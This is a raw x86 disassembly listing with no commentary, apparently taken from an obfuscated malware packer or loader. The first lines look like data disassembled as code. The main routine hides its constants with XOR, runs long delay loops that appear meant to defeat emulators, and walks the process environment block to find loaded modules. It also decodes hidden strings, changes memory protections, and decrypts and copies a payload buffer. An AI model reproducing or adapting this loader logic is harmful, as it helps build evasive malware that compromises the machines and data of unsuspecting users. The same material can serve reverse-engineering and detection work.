  425bc3:	xor    cl,BYTE PTR [ecx-0x7964c844]
  425bc9:	mov    WORD PTR [ebp-0x7a],?
  425bcc:	xchg   BYTE PTR [esi-0x4b09ac76],al
  425bd2:	mov    bh,0x16
  425bd4:	lea    dx,[edi]
  425bd7:	push   ss
  425bd8:	push   es
  425bd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425bda:	jb     0x425b93
  425bdc:	push   ss
  425bdd:	not    DWORD PTR [ebx-0x8]
  425be0:	mov    al,0xca
  425be2:	test   DWORD PTR [edi+0x158d6616],edx
  425be8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425be9:	test   al,0xd7
  425beb:	push   ss
  425bec:	push   es
  425bed:	mov    ah,0xb5
  425bef:	ret    0x55b7
  425bf2:	add    cl,al
  425bf4:	jmp    0xcaf16b04
  425bf9:	cmp    DWORD PTR [esp+0x20],ecx
  425bfd:	jae    0x425c16
  425bff:	mov    ebx,ecx
  425c01:	mov    ecx,0x800
  425c06:	sub    ecx,edx
  425c08:	shr    ecx,0x5
  425c0b:	add    WORD PTR [ebp+0x0],cx
  425c0f:	add    eax,eax
  425c11:	lea    ebp,[esp+0x40]
  425c15:	ret    
  425c16:	shr    edx,0x5
  425c19:	sub    DWORD PTR [esp+0x20],ecx
  425c1d:	sub    ebx,ecx
  425c1f:	sub    WORD PTR [ebp+0x0],dx
  425c23:	add    eax,eax
  425c25:	add    eax,0x1
  425c28:	lea    ebp,[esp+0x40]
  425c2c:	ret    
  425c2d:	push   ebp
  425c2e:	mov    ebp,esp
  425c30:	sub    esp,0x12c
  425c36:	push   ebx
  425c37:	push   esi
  425c38:	push   edi
  425c39:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  425c40:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  425c47:	mov    eax,DWORD PTR [ebp+0x8]
  425c4a:	mov    DWORD PTR [ebp+0x8],eax
  425c4d:	mov    ecx,DWORD PTR [ebp-0x10]
  425c50:	mov    ebx,0x75108aa
  425c55:	xor    ecx,ebx
  425c57:	mov    eax,0x3272f1
  425c5c:	add    ecx,eax
  425c5e:	mov    DWORD PTR [ebp-0x24],ecx
  425c61:	mov    ecx,DWORD PTR [ebp-0x10]
  425c64:	xor    ecx,ebx
  425c66:	add    ecx,eax
  425c68:	mov    DWORD PTR [ebp-0x40],ecx
  425c6b:	mov    ecx,DWORD PTR [ebp-0x10]
  425c6e:	xor    ecx,ebx
  425c70:	add    ecx,eax
  425c72:	mov    DWORD PTR [ebp-0x3c],ecx
  425c75:	mov    ecx,DWORD PTR [ebp-0x10]
  425c78:	xor    ecx,ebx
  425c7a:	add    ecx,eax
  425c7c:	mov    DWORD PTR [ebp-0xd8],ecx
  425c82:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  425c89:	mov    DWORD PTR [ebp-0x3c],0xf89cb5a5
  425c90:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  425c97:	push   0x25
  425c99:	pop    ecx
  425c9a:	mov    DWORD PTR [ebp-0x30],ecx
  425c9d:	mov    DWORD PTR [ebp-0x30],ecx
  425ca0:	push   0x65
  425ca2:	pop    ecx
  425ca3:	mov    DWORD PTR [ebp-0x30],ecx
  425ca6:	mov    DWORD PTR [ebp-0x30],ecx
  425ca9:	mov    DWORD PTR [ebp-0x30],0x4d
  425cb0:	mov    DWORD PTR [ebp-0x30],0x43
  425cb7:	mov    ecx,DWORD PTR [ebp-0x10]
  425cba:	xor    ecx,ebx
  425cbc:	add    ecx,eax
  425cbe:	mov    DWORD PTR [ebp-0x30],ecx
  425cc1:	mov    ecx,DWORD PTR [ebp-0x10]
  425cc4:	xor    ecx,ebx
  425cc6:	add    ecx,eax
  425cc8:	mov    DWORD PTR [ebp-0x30],ecx
  425ccb:	mov    DWORD PTR [ebp-0x28],0x258
  425cd2:	mov    DWORD PTR [ebp-0x34],0x36
  425cd9:	mov    DWORD PTR [ebp-0x14],0x7a
  425ce0:	lea    edi,[ebp-0x10c]
  425ce6:	lea    esi,[ebp-0x12c]
  425cec:	call   0x4269ab
  425cf1:	dec    DWORD PTR [ebp-0x14]
  425cf4:	jne    0x425ce0
  425cf6:	dec    DWORD PTR [ebp-0x34]
  425cf9:	jne    0x425cd9
  425cfb:	dec    DWORD PTR [ebp-0x28]
  425cfe:	jne    0x425cd2
  425d00:	mov    DWORD PTR [ebp-0x28],0x400e
  425d07:	mov    eax,DWORD PTR [ebp-0x10]
  425d0a:	xor    eax,ebx
  425d0c:	mov    esi,0x3272f1
  425d11:	add    eax,esi
  425d13:	mov    DWORD PTR [ebp-0x1c],eax
  425d16:	mov    eax,DWORD PTR [ebp-0x10]
  425d19:	and    DWORD PTR [ebp-0x94],0x0
  425d20:	xor    eax,ebx
  425d22:	add    eax,esi
  425d24:	mov    DWORD PTR [ebp-0x38],eax
  425d27:	mov    eax,fs:0x18
  425d2d:	mov    DWORD PTR [ebp-0x94],eax
  425d33:	mov    eax,DWORD PTR [eax+0x30]
  425d36:	mov    DWORD PTR [ebp-0xcc],eax
  425d3c:	mov    eax,DWORD PTR [eax+0xc]
  425d3f:	mov    DWORD PTR [ebp-0xc0],eax
  425d45:	mov    eax,DWORD PTR [ebp+0x8]
  425d48:	lea    ecx,[ebp-0x94]
  425d4e:	mov    DWORD PTR [eax+0x1a0],ecx
  425d54:	mov    eax,DWORD PTR [ebp+0x8]
  425d57:	lea    ecx,[ebp-0xcc]
  425d5d:	mov    DWORD PTR [eax+0x1a4],ecx
  425d63:	mov    eax,DWORD PTR [ebp+0x8]
  425d66:	push   DWORD PTR [ebp+0x8]
  425d69:	lea    ecx,[ebp-0xc0]
  425d6f:	mov    DWORD PTR [eax+0x1a8],ecx
  425d75:	call   0x42816c
  425d7a:	mov    ecx,DWORD PTR [ebp-0x10]
  425d7d:	xor    ecx,ebx
  425d7f:	add    ecx,esi
  425d81:	cmp    ecx,eax
  425d83:	je     0x426106
  425d89:	mov    eax,DWORD PTR [ebp+0x8]
  425d8c:	mov    eax,DWORD PTR [eax+0x194]
  425d92:	mov    ecx,DWORD PTR [eax]
  425d94:	mov    eax,DWORD PTR [ebp+0x8]
  425d97:	mov    eax,DWORD PTR [eax+0x194]
  425d9d:	mov    eax,DWORD PTR [eax]
  425d9f:	add    eax,DWORD PTR [ecx+0x3c]
  425da2:	mov    ecx,DWORD PTR [ebp+0x8]
  425da5:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425dab:	lea    edx,[ebp-0xec]
  425db1:	push   edx
  425db2:	mov    edx,DWORD PTR [ebp+0x8]
  425db5:	mov    edx,DWORD PTR [edx+0x18c]
  425dbb:	mov    edx,DWORD PTR [edx]
  425dbd:	add    edx,DWORD PTR [eax+0x88]
  425dc3:	push   0x4
  425dc5:	push   DWORD PTR [eax+0x8c]
  425dcb:	push   edx
  425dcc:	call   DWORD PTR [ecx+0x1c]
  425dcf:	push   DWORD PTR [ebp+0x8]
  425dd2:	xor    eax,eax
  425dd4:	mov    DWORD PTR [ebp-0xa8],0x1b3e0e34
  425dde:	mov    DWORD PTR [ebp-0xa4],0x12370d1c
  425de8:	mov    DWORD PTR [ebp-0xa0],0x3c0d180a
  425df2:	mov    BYTE PTR [ebp-0x9c],0x83
  425df9:	lea    edi,[ebp-0x9b]
  425dff:	stos   DWORD PTR es:[edi],eax
  425e00:	stos   WORD PTR es:[edi],ax
  425e02:	stos   BYTE PTR es:[edi],al
  425e03:	xor    eax,eax
  425e05:	mov    DWORD PTR [ebp-0xbc],0x1b3e0e34
  425e0f:	mov    DWORD PTR [ebp-0xb8],0x12370d1c
  425e19:	mov    DWORD PTR [ebp-0xb4],0x2a0d180a
  425e23:	mov    BYTE PTR [ebp-0xb0],0x83
  425e2a:	lea    edi,[ebp-0xaf]
  425e30:	stos   DWORD PTR es:[edi],eax
  425e31:	stos   WORD PTR es:[edi],ax
  425e33:	stos   BYTE PTR es:[edi],al
  425e34:	mov    edi,DWORD PTR [ebp+0x8]
  425e37:	mov    eax,DWORD PTR [ebp+0x8]
  425e3a:	mov    edx,DWORD PTR [eax+0x1b8]
  425e40:	mov    DWORD PTR [ebp-0x68],0xd0f0e17
  425e47:	mov    DWORD PTR [ebp-0x64],0x1413101e
  425e4e:	mov    WORD PTR [ebp-0x60],0x833c
  425e54:	mov    DWORD PTR [ebp-0x90],0x1b3e0e34
  425e5e:	mov    DWORD PTR [ebp-0x8c],0x173c0d1c
  425e68:	mov    DWORD PTR [ebp-0x88],0x311c1b13
  425e72:	mov    DWORD PTR [ebp-0x84],0xd181008
  425e7c:	mov    DWORD PTR [ebp-0x80],0x833c1e14
  425e83:	mov    DWORD PTR [ebp-0x7c],0x1b3e0e34
  425e8a:	mov    DWORD PTR [ebp-0x78],0x173c0d1c
  425e91:	mov    DWORD PTR [ebp-0x74],0x311c1b13
  425e98:	mov    DWORD PTR [ebp-0x70],0xd181008
  425e9f:	mov    DWORD PTR [ebp-0x6c],0x832a1e14
  425ea6:	call   0x42819b
  425eab:	push   eax
  425eac:	mov    eax,DWORD PTR [ebp+0x8]
  425eaf:	mov    eax,DWORD PTR [eax+0x1a8]
  425eb5:	push   DWORD PTR [eax]
  425eb7:	call   0x427e3c
  425ebc:	test   eax,eax
  425ebe:	jne    0x425f10
  425ec0:	mov    eax,DWORD PTR [ebp+0x8]
  425ec3:	mov    eax,DWORD PTR [eax+0x1e0]
  425ec9:	mov    edi,DWORD PTR [ebp+0x8]
  425ecc:	add    eax,0x4
  425ecf:	mov    DWORD PTR [ebp-0x20],eax
  425ed2:	mov    eax,DWORD PTR [ebp+0x8]
  425ed5:	mov    edx,DWORD PTR [eax+0x1b8]
  425edb:	call   0x42819b
  425ee0:	push   eax
  425ee1:	mov    eax,DWORD PTR [ebp-0x20]
  425ee4:	call   DWORD PTR [eax]
  425ee6:	test   eax,eax
  425ee8:	jne    0x425f10
  425eea:	mov    eax,DWORD PTR [ebp+0x8]
  425eed:	mov    eax,DWORD PTR [eax+0x1e0]
  425ef3:	mov    edi,DWORD PTR [ebp+0x8]
  425ef6:	add    eax,0x10
  425ef9:	mov    DWORD PTR [ebp-0x20],eax
  425efc:	mov    eax,DWORD PTR [ebp+0x8]
  425eff:	mov    edx,DWORD PTR [eax+0x1b8]
  425f05:	call   0x42819b
  425f0a:	push   eax
  425f0b:	mov    eax,DWORD PTR [ebp-0x20]
  425f0e:	call   DWORD PTR [eax]
  425f10:	mov    eax,DWORD PTR [ebp-0x10]
  425f13:	mov    ecx,DWORD PTR [ebp-0x28]
  425f16:	xor    eax,ebx
  425f18:	add    eax,esi
  425f1a:	cmp    eax,ecx
  425f1c:	je     0x4260df
  425f22:	mov    eax,DWORD PTR [ebp-0x18]
  425f25:	xor    eax,ebx
  425f27:	mov    ecx,0xffcd8d0f
  425f2c:	sub    ecx,eax
  425f2e:	add    ecx,DWORD PTR [ebp-0x28]
  425f31:	mov    eax,DWORD PTR [ebp-0x1c]
  425f34:	cmp    eax,ecx
  425f36:	ja     0x4260df
  425f3c:	mov    DWORD PTR [ebp-0x34],0x0
  425f43:	push   DWORD PTR [ebp+0x8]
  425f46:	mov    edi,DWORD PTR [ebp+0x8]
  425f49:	mov    eax,DWORD PTR [ebp+0x8]
  425f4c:	mov    edx,DWORD PTR [eax+0x1b4]
  425f52:	call   0x42819b
  425f57:	push   eax
  425f58:	mov    eax,DWORD PTR [ebp+0x8]
  425f5b:	mov    eax,DWORD PTR [eax+0x1a8]
  425f61:	push   DWORD PTR [eax]
  425f63:	call   0x427e3c
  425f68:	mov    ecx,DWORD PTR [ebp+0x8]
  425f6b:	mov    ecx,DWORD PTR [ecx+0x19c]
  425f71:	mov    DWORD PTR [ecx],eax
  425f73:	mov    eax,DWORD PTR [ebp+0x8]
  425f76:	mov    edi,DWORD PTR [eax+0x1e0]
  425f7c:	mov    esi,DWORD PTR [ebp+0x8]
  425f7f:	xor    eax,eax
  425f81:	lea    edx,[ebp-0x7c]
  425f84:	call   0x4281d1
  425f89:	push   eax
  425f8a:	mov    eax,DWORD PTR [ebp+0x8]
  425f8d:	mov    eax,DWORD PTR [eax+0x19c]
  425f93:	push   DWORD PTR [eax]
  425f95:	call   DWORD PTR [edi+0x8]
  425f98:	mov    DWORD PTR [ebp-0x20],eax
  425f9b:	mov    eax,DWORD PTR [ebp+0x8]
  425f9e:	mov    edi,DWORD PTR [eax+0x1e0]
  425fa4:	mov    esi,DWORD PTR [ebp+0x8]
  425fa7:	xor    eax,eax
  425fa9:	lea    edx,[ebp-0x90]
  425faf:	call   0x4281d1
  425fb4:	push   eax
  425fb5:	mov    eax,DWORD PTR [ebp+0x8]
  425fb8:	mov    eax,DWORD PTR [eax+0x19c]
  425fbe:	push   DWORD PTR [eax]
  425fc0:	call   DWORD PTR [edi+0x8]
  425fc3:	mov    eax,DWORD PTR [ebp+0x8]
  425fc6:	mov    edi,DWORD PTR [eax+0x1e0]
  425fcc:	mov    esi,DWORD PTR [ebp+0x8]
  425fcf:	xor    eax,eax
  425fd1:	lea    edx,[ebp-0xa8]
  425fd7:	call   0x4281d1
  425fdc:	push   eax
  425fdd:	mov    eax,DWORD PTR [ebp+0x8]
  425fe0:	mov    eax,DWORD PTR [eax+0x19c]
  425fe6:	push   DWORD PTR [eax]
  425fe8:	call   DWORD PTR [edi+0x8]
  425feb:	and    DWORD PTR [ebp-0x8],0x0
  425fef:	mov    DWORD PTR [ebp-0x48],eax
  425ff2:	mov    eax,DWORD PTR [ebp-0x8]
  425ff5:	and    eax,0x7
  425ff8:	add    eax,0x31
  425ffb:	push   eax
  425ffc:	call   DWORD PTR [ebp-0x20]
  425fff:	test   eax,eax
  426001:	je     0x426045
  426003:	mov    eax,DWORD PTR [ebp-0x8]
  426006:	push   0x19
  426008:	xor    edx,edx
  42600a:	pop    ecx
  42600b:	div    ecx
  42600d:	add    dl,0x41
  426010:	movzx  eax,dl
  426013:	push   eax
  426014:	call   DWORD PTR [ebp-0x48]
  426017:	test   eax,eax
  426019:	jne    0x426045
  42601b:	mov    eax,DWORD PTR [ebp+0x8]
  42601e:	mov    edi,DWORD PTR [eax+0x1e0]
  426024:	mov    esi,DWORD PTR [ebp+0x8]
  426027:	xor    eax,eax
  426029:	lea    edx,[ebp-0x68]
  42602c:	call   0x4281d1
  426031:	push   eax
  426032:	mov    eax,DWORD PTR [ebp+0x8]
  426035:	mov    eax,DWORD PTR [eax+0x198]
  42603b:	push   DWORD PTR [eax]
  42603d:	call   DWORD PTR [edi+0x8]
  426040:	mov    DWORD PTR [ebp-0x14],eax
  426043:	jmp    0x426049
  426045:	and    DWORD PTR [ebp-0x14],0x0
  426049:	inc    DWORD PTR [ebp-0x8]
  42604c:	cmp    DWORD PTR [ebp-0x8],0x10
  426050:	jb     0x425ff2
  426052:	mov    eax,DWORD PTR [ebp-0x18]
  426055:	mov    esi,DWORD PTR [ebp+0x8]
  426058:	xor    eax,ebx
  42605a:	mov    edi,0x3272f1
  42605f:	add    eax,edi
  426061:	lea    edx,[ebp-0x10c]
  426067:	call   0x4281d1
  42606c:	push   eax
  42606d:	mov    eax,DWORD PTR [ebp-0x10]
  426070:	mov    esi,DWORD PTR [ebp+0x8]
  426073:	xor    eax,ebx
  426075:	add    eax,edi
  426077:	lea    edx,[ebp-0x12c]
  42607d:	call   0x4281d1
  426082:	push   eax
  426083:	call   DWORD PTR [ebp-0x14]
  426086:	mov    ecx,DWORD PTR [ebp-0x10]
  426089:	xor    ecx,ebx
  42608b:	add    ecx,edi
  42608d:	cmp    ecx,eax
  42608f:	jne    0x426098
  426091:	mov    DWORD PTR [ebp-0x34],0x1
  426098:	mov    eax,DWORD PTR [ebp-0x18]
  42609b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42609e:	xor    eax,ebx
  4260a0:	lea    eax,[eax+ecx*1+0x3272f1]
  4260a7:	mov    DWORD PTR [ebp-0x1c],eax
  4260aa:	mov    eax,DWORD PTR [ebp-0x34]
  4260ad:	test   eax,eax
  4260af:	je     0x4260c3
  4260b1:	mov    eax,DWORD PTR [ebp-0x18]
  4260b4:	mov    ecx,DWORD PTR [ebp-0x38]
  4260b7:	xor    eax,ebx
  4260b9:	lea    eax,[eax+ecx*1+0x3272f1]
  4260c0:	mov    DWORD PTR [ebp-0x38],eax
  4260c3:	mov    eax,DWORD PTR [ebp-0x18]
  4260c6:	xor    eax,ebx
  4260c8:	mov    ecx,0xffcd8d0f
  4260cd:	sub    ecx,eax
  4260cf:	add    ecx,DWORD PTR [ebp-0x28]
  4260d2:	mov    eax,DWORD PTR [ebp-0x1c]
  4260d5:	cmp    eax,ecx
  4260d7:	jbe    0x425f3c
  4260dd:	mov    esi,edi
  4260df:	mov    eax,DWORD PTR [ebp-0x38]
  4260e2:	mov    ecx,DWORD PTR [ebp-0x1c]
  4260e5:	cmp    ecx,eax
  4260e7:	jne    0x4260fa
  4260e9:	push   DWORD PTR [ebp+0x8]
  4260ec:	lea    eax,[ebp-0x40]
  4260ef:	push   eax
  4260f0:	call   0x428c3e
  4260f5:	mov    DWORD PTR [ebp-0x24],eax
  4260f8:	jmp    0x426106
  4260fa:	mov    eax,DWORD PTR [ebp-0x24]
  4260fd:	mov    ecx,DWORD PTR [ebp-0x18]
  426100:	xor    ecx,ebx
  426102:	add    ecx,esi
  426104:	xor    DWORD PTR [eax],ecx
  426106:	mov    eax,DWORD PTR [ebp-0x10]
  426109:	mov    ecx,DWORD PTR [ebp-0x24]
  42610c:	xor    eax,ebx
  42610e:	add    eax,esi
  426110:	cmp    eax,ecx
  426112:	je     0x426889
  426118:	mov    eax,DWORD PTR [ebp-0x10]
  42611b:	mov    ecx,DWORD PTR [ebp-0x40]
  42611e:	xor    eax,ebx
  426120:	add    eax,esi
  426122:	cmp    eax,ecx
  426124:	je     0x426889
  42612a:	mov    eax,DWORD PTR [ebp-0x10]
  42612d:	xor    eax,ebx
  42612f:	add    eax,esi
  426131:	jmp    0x42614f
  426133:	mov    edi,DWORD PTR [ebp-0x24]
  426136:	mov    cl,al
  426138:	and    cl,0x1f
  42613b:	or     dl,0xff
  42613e:	sub    dl,cl
  426140:	add    BYTE PTR [edi+eax*1],dl
  426143:	mov    ecx,DWORD PTR [ebp-0x18]
  426146:	xor    ecx,ebx
  426148:	lea    eax,[eax+ecx*1+0x3272f1]
  42614f:	mov    ecx,DWORD PTR [ebp-0x40]
  426152:	cmp    eax,ecx
  426154:	jb     0x426133
  426156:	mov    eax,DWORD PTR [ebp-0x40]
  426159:	mov    DWORD PTR [ebp-0x28],eax
  42615c:	mov    eax,DWORD PTR [ebp-0x24]
  42615f:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  426166:	mov    DWORD PTR [ebp-0xd4],eax
  42616c:	mov    edi,0xf89c85ba
  426171:	mov    DWORD PTR [ebp-0x2c],edi
  426174:	mov    eax,DWORD PTR [ebp-0x38]
  426177:	xor    eax,ebx
  426179:	add    eax,esi
  42617b:	mov    DWORD PTR [ebp-0xc],eax
  42617e:	mov    eax,DWORD PTR [ebp-0x38]
  426181:	xor    eax,ebx
  426183:	add    eax,esi
  426185:	mov    DWORD PTR [ebp-0x8],eax
  426188:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  42618f:	mov    DWORD PTR [ebp-0x4c],0xf89c85bc
  426196:	mov    eax,DWORD PTR [ebp-0x38]
  426199:	mov    ecx,DWORD PTR [ebp-0x28]
  42619c:	xor    eax,ebx
  42619e:	add    eax,esi
  4261a0:	cmp    ecx,eax
  4261a2:	je     0x4263a1
  4261a8:	jmp    0x42637d
  4261ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4261b0:	mov    eax,DWORD PTR [ebp-0x28]
  4261b3:	sub    eax,ecx
  4261b5:	mov    ecx,DWORD PTR [ebp-0x48]
  4261b8:	xor    ecx,ebx
  4261ba:	add    ecx,esi
  4261bc:	xor    edx,edx
  4261be:	div    ecx
  4261c0:	mov    DWORD PTR [ebp-0x8],eax
  4261c3:	mov    eax,DWORD PTR [ebp-0x4c]
  4261c6:	mov    ecx,DWORD PTR [ebp-0x8]
  4261c9:	xor    eax,ebx
  4261cb:	add    eax,esi
  4261cd:	cmp    ecx,eax
  4261cf:	jbe    0x4261db
  4261d1:	mov    eax,DWORD PTR [ebp-0x4c]
  4261d4:	xor    eax,ebx
  4261d6:	add    eax,esi
  4261d8:	mov    DWORD PTR [ebp-0x8],eax
  4261db:	mov    eax,DWORD PTR [ebp-0x48]
  4261de:	mov    ecx,DWORD PTR [ebp-0x8]
  4261e1:	xor    eax,ebx
  4261e3:	add    eax,esi
  4261e5:	imul   eax,ecx
  4261e8:	mov    DWORD PTR [ebp-0x8],eax
  4261eb:	mov    eax,DWORD PTR [ebp-0x38]
  4261ee:	mov    ecx,DWORD PTR [ebp-0x8]
  4261f1:	xor    eax,ebx
  4261f3:	add    eax,esi
  4261f5:	cmp    ecx,eax
  4261f7:	je     0x42636b
  4261fd:	mov    eax,DWORD PTR [ebp-0x8]
  426200:	mov    DWORD PTR [ebp-0x14],eax
  426203:	mov    eax,DWORD PTR [ebp-0xc]
  426206:	add    eax,DWORD PTR [ebp-0xd4]
  42620c:	mov    DWORD PTR [ebp-0x20],0xf89c85a5
  426213:	mov    DWORD PTR [ebp-0x34],edi
  426216:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  426220:	mov    DWORD PTR [ebp-0x8],eax
  426223:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  42622a:	mov    DWORD PTR [ebp-0x1c],edi
  42622d:	mov    eax,DWORD PTR [ebp-0x20]
  426230:	xor    eax,ebx
  426232:	add    eax,esi
  426234:	jmp    0x42632a
  426239:	mov    DWORD PTR [ebp-0xe0],0xf89c85b0
  426243:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  42624d:	mov    eax,DWORD PTR [ebp-0x1c]
  426250:	mov    ecx,DWORD PTR [ebp-0x44]
  426253:	xor    eax,ebx
  426255:	add    eax,esi
  426257:	imul   eax,ecx
  42625a:	mov    ecx,DWORD PTR [ebp-0x8]
  42625d:	mov    al,BYTE PTR [eax+ecx*1]
  426260:	mov    BYTE PTR [ebp-0x2],al
  426263:	mov    eax,DWORD PTR [ebp-0x1c]
  426266:	mov    ecx,DWORD PTR [ebp-0x44]
  426269:	xor    eax,ebx
  42626b:	add    eax,esi
  42626d:	imul   eax,ecx
  426270:	mov    ecx,DWORD PTR [ebp-0xe8]
  426276:	xor    ecx,ebx
  426278:	add    eax,ecx
  42627a:	mov    ecx,DWORD PTR [ebp-0x8]
  42627d:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  426285:	mov    ecx,DWORD PTR [ebp-0xe0]
  42628b:	xor    ecx,ebx
  42628d:	lea    eax,[ecx+eax*1+0x3272f1]
  426294:	movzx  ecx,BYTE PTR [ebp-0x2]
  426298:	xor    ecx,eax
  42629a:	mov    BYTE PTR [ebp-0x2],cl
  42629d:	mov    al,BYTE PTR [ebp-0x2]
  4262a0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4262a3:	mov    edx,DWORD PTR [ebp-0x44]
  4262a6:	xor    ecx,ebx
  4262a8:	add    ecx,esi
  4262aa:	imul   ecx,edx
  4262ad:	mov    edx,DWORD PTR [ebp-0x8]
  4262b0:	mov    BYTE PTR [ecx+edx*1],al
  4262b3:	mov    eax,DWORD PTR [ebp-0x1c]
  4262b6:	mov    ecx,DWORD PTR [ebp-0x44]
  4262b9:	xor    eax,ebx
  4262bb:	add    eax,esi
  4262bd:	imul   eax,ecx
  4262c0:	mov    ecx,DWORD PTR [ebp-0x8]
  4262c3:	mov    al,BYTE PTR [eax+ecx*1]
  4262c6:	mov    BYTE PTR [ebp-0x2],al
  4262c9:	mov    eax,DWORD PTR [ebp-0x1c]
  4262cc:	mov    ecx,DWORD PTR [ebp-0x44]
  4262cf:	xor    eax,ebx
  4262d1:	add    eax,esi
  4262d3:	imul   eax,ecx
  4262d6:	mov    ecx,DWORD PTR [ebp-0x34]
  4262d9:	xor    ecx,ebx
  4262db:	add    eax,ecx
  4262dd:	mov    ecx,DWORD PTR [ebp-0x8]
  4262e0:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  4262e8:	mov    ecx,DWORD PTR [ebp-0xc4]
  4262ee:	xor    ecx,ebx
  4262f0:	lea    eax,[ecx+eax*1+0x3272f1]
  4262f7:	movzx  ecx,BYTE PTR [ebp-0x2]
  4262fb:	xor    ecx,eax
  4262fd:	mov    BYTE PTR [ebp-0x2],cl
  426300:	mov    al,BYTE PTR [ebp-0x2]
  426303:	mov    ecx,DWORD PTR [ebp-0x1c]
  426306:	mov    edx,DWORD PTR [ebp-0x44]
  426309:	xor    ecx,ebx
  42630b:	add    ecx,esi
  42630d:	imul   ecx,edx
  426310:	mov    edx,DWORD PTR [ebp-0x8]
  426313:	mov    BYTE PTR [ecx+edx*1],al
  426316:	mov    eax,DWORD PTR [ebp-0x30]
  426319:	mov    ecx,DWORD PTR [ebp-0x34]
  42631c:	xor    eax,ebx
  42631e:	xor    ecx,ebx
  426320:	add    eax,esi
  426322:	add    ecx,esi
  426324:	imul   eax,ecx
  426327:	add    eax,DWORD PTR [ebp-0x44]
  42632a:	mov    DWORD PTR [ebp-0x44],eax
  42632d:	mov    eax,DWORD PTR [ebp-0x44]
  426330:	mov    ecx,DWORD PTR [ebp-0x14]
  426333:	cmp    ecx,eax
  426335:	jb     0x426239
  42633b:	mov    eax,DWORD PTR [ebp-0x34]
  42633e:	mov    ecx,DWORD PTR [ebp-0x14]
  426341:	xor    eax,ebx
  426343:	add    eax,esi
  426345:	imul   eax,ecx
  426348:	mov    ecx,DWORD PTR [ebp-0x20]
  42634b:	xor    ecx,ebx
  42634d:	add    ecx,esi
  42634f:	or     eax,ecx
  426351:	mov    ecx,DWORD PTR [ebp-0x2c]
  426354:	xor    ecx,ebx
  426356:	add    eax,ecx
  426358:	mov    ecx,DWORD PTR [ebp-0x2c]
  42635b:	xor    ecx,ebx
  42635d:	add    eax,ecx
  42635f:	mov    ecx,DWORD PTR [ebp-0xc]
  426362:	lea    eax,[eax+ecx*1+0x64e5e2]
  426369:	jmp    0x42637a
  42636b:	mov    eax,DWORD PTR [ebp-0x2c]
  42636e:	mov    ecx,DWORD PTR [ebp-0xc]
  426371:	xor    eax,ebx
  426373:	lea    eax,[eax+ecx*1+0x3272f1]
  42637a:	mov    DWORD PTR [ebp-0xc],eax
  42637d:	mov    eax,DWORD PTR [ebp-0x2c]
  426380:	xor    eax,ebx
  426382:	mov    ecx,0xffcd8d0f
  426387:	sub    ecx,eax
  426389:	add    ecx,DWORD PTR [ebp-0x28]
  42638c:	mov    eax,DWORD PTR [ebp-0x2c]
  42638f:	mov    edx,DWORD PTR [ebp-0xc]
  426392:	xor    eax,ebx
  426394:	add    eax,esi
  426396:	imul   eax,edx
  426399:	cmp    eax,ecx
  42639b:	jbe    0x4261ad
  4263a1:	mov    eax,DWORD PTR [ebp-0x10]
  4263a4:	mov    ecx,DWORD PTR [ebp-0x40]
  4263a7:	mov    eax,DWORD PTR [ebp+0x8]
  4263aa:	mov    edx,DWORD PTR [ebp-0x54]
  4263ad:	mov    eax,DWORD PTR [eax+0x1e0]
  4263b3:	xor    edx,ebx
  4263b5:	add    edx,esi
  4263b7:	push   edx
  4263b8:	mov    edx,DWORD PTR [ebp-0x3c]
  4263bb:	xor    edx,ebx
  4263bd:	add    edx,esi
  4263bf:	push   edx
  4263c0:	push   ecx
  4263c1:	mov    DWORD PTR [ebp-0x30],ecx
  4263c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4263c7:	xor    ecx,ebx
  4263c9:	add    ecx,esi
  4263cb:	push   ecx
  4263cc:	call   DWORD PTR [eax+0x14]
  4263cf:	mov    edi,eax
  4263d1:	mov    eax,DWORD PTR [ebp-0x10]
  4263d4:	xor    eax,ebx
  4263d6:	add    eax,esi
  4263d8:	cmp    eax,edi
  4263da:	je     0x426435
  4263dc:	mov    eax,DWORD PTR [ebp-0x10]
  4263df:	jmp    0x426402
  4263e1:	mov    ecx,DWORD PTR [ebp-0x24]
  4263e4:	xor    eax,ebx
  4263e6:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f1]
  4263ed:	mov    BYTE PTR [eax+edi*1+0x3272f1],cl
  4263f4:	mov    ecx,DWORD PTR [ebp-0x18]
  4263f7:	xor    ecx,ebx
  4263f9:	lea    eax,[ecx+eax*1+0x3272f1]
  426400:	xor    eax,ebx
  426402:	mov    ecx,DWORD PTR [ebp-0x40]
  426405:	sub    ecx,esi
  426407:	xor    ecx,ebx
  426409:	cmp    eax,ecx
  42640b:	jne    0x4263e1
  42640d:	mov    eax,DWORD PTR [ebp+0x8]
  426410:	mov    ecx,DWORD PTR [ebp-0x50]
  426413:	mov    eax,DWORD PTR [eax+0x1e0]
  426419:	xor    ecx,ebx
  42641b:	add    ecx,esi
  42641d:	push   ecx
  42641e:	mov    ecx,DWORD PTR [ebp-0x10]
  426421:	xor    ecx,ebx
  426423:	add    ecx,esi
  426425:	push   ecx
  426426:	push   DWORD PTR [ebp-0x24]
  426429:	call   DWORD PTR [eax+0x18]
  42642c:	mov    eax,DWORD PTR [ebp-0x30]
  42642f:	mov    DWORD PTR [ebp-0x24],edi
  426432:	mov    DWORD PTR [ebp-0x40],eax
  426435:	mov    edi,DWORD PTR [ebp-0x24]
  426438:	mov    eax,DWORD PTR [ebp-0x18]
  42643b:	mov    ecx,DWORD PTR [ebp-0x10]
  42643e:	xor    eax,ebx
  426440:	mov    DWORD PTR [ebp-0x30],edi
  426443:	add    eax,esi
  426445:	mov    DWORD PTR [ebp-0x5c],0x3c2b332b
  42644c:	mov    DWORD PTR [ebp-0x58],0x362b3e2b
